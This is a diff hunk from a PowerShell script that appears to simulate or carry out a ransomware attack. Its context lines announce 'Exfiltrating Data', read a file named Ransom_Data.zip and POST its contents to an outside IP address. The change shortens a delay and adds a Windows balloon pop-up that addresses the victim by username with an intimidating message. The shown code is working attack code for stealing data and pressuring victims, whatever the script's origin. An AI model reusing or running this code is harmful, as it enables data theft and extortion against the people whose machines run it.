@@ -716,7 +716,14 @@ Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
 $content1 = Get-Content C:\temp\Ransom_Data.zip
 Invoke-WebRequest -Uri 172.31.33.46 -Method POST -Body $content1
 
+Start-Sleep -S 5
 
-Start-Sleep -S 15
-
-
+Add-Type -AssemblyName System.Windows.Forms
+$global:balmsg = New-Object System.Windows.Forms.NotifyIcon
+$path = (Get-Process -id $pid).Path
+$balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
+$balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
+$balmsg.BalloonTipText = ‘CONTROL CAN SOMTIMES BE AN ILLUSION. BUT SOMETIMES YOU NEED ILLUSION TO GAIN CONTROL.'
+$balmsg.BalloonTipTitle = "Attention $Env:USERNAME"
+$balmsg.Visible = $true
+$balmsg.ShowBalloonTip(20000)
